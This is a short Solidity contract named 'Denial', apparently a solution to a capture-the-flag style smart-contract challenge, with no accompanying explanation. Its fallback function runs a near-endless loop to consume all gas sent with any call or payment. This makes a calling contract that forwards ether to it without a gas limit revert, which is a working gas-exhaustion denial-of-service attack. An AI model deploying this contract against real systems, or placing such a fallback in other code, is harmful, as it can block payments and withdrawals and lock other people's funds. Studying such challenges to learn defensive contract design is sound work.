pragma solidity ^0.8.0;

contract Denial {
    uint count;
    fallback() external payable {
        for (uint i = 0; i < 1000000000000000; i++) {
            count ++;
        }
    }
}
